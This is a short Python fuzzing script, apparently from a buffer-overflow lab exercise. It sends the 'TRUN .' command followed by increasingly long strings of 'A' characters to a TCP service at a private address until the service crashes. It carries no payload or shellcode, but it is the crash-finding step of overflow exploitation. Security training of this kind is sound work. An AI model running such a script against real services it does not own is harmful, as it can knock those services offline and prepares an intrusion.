#!/usr/bin/python3

import socket

# Python fuzzer

def main():
    # set ip and port
    ip = "192.168.1.2"
    port = 9999

    # set up socket stuff
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip,port))

    # in order to reach the part of the code that
    # does the exploit you need to begin with this
    command = "TRUN ."

    print(sock.recv(1024).decode("utf-8"))

    for i in range(3000):
        garbage = "A"*i
        exploit_str = command + garbage
        
        print("Sending " + str(i) + " A's \t Total length is " + str(len(exploit_str)))
        sock.send(exploit_str.encode("utf-8"))
        
        # get and print the response
        # when it finally crashes this is where we will be stopped
        print(sock.recv(1024).decode("utf-8"))
        



if __name__ == "__main__":
    main()